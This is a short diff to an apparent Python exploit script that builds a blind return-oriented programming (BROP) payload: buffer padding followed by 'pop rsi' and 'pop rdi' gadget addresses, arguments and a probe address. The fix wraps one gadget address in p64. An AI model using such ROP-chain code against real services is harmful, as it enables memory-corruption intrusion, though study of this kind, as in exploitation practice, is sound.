@@ -27,7 +27,7 @@ def call(probe, size, brop_addr, arg1, arg2):
     payload = size * b'A'
     payload += p64(brop_addr + 0x7) # pop rsi ; pop r15 ; ret
     payload += p64(arg1) * 2
-    payload += (brop_addr + 0x9) # pop rdi ; ret
+    payload += p64(brop_addr + 0x9) # pop rdi ; ret
     payload += p64(arg2)
     payload += p64(probe)
     
